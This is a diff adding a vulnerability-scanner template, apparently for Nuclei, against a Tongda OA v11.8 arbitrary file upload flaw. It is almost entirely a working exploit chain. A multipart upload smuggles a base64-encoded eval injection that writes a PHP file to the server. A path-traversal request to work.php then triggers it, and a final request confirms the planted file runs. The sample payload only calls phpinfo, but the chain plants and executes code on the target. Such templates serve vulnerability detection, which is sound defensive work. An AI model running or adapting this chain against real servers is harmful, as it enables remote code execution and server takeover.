@@ -1,0 +1,45 @@
+id: tongda-oa-api-ali-arbitrary-file-upload
+
+info:
+  name: tongda-oa-api-ali-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v11.8%20api.ali.php%20任意文件上传漏洞.html
+  tags: tongda,oa
+
+http:
+  - raw:
+      - |
+        POST /mobile/api/api.ali.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=502f67681799b07e5de6b503655f5cae
+        Accept-Encoding: gzip
+
+        --502f67681799b07e5de6b503655f5cae
+        Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
+        Content-Type: application/octet-stream
+
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{"a":"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*"}"}
+        --502f67681799b07e5de6b503655f5cae--
+
+      - |
+        GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{trim_prefix(date_time("%Y%M", unix_time()),"20")}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        GET /fb6790f4.php  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+
+    # req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200 && contains(body_2,"OK")'
+          - 'status_code_3 == 200 && contains(body_3,"phpinfo")'
+        condition: and
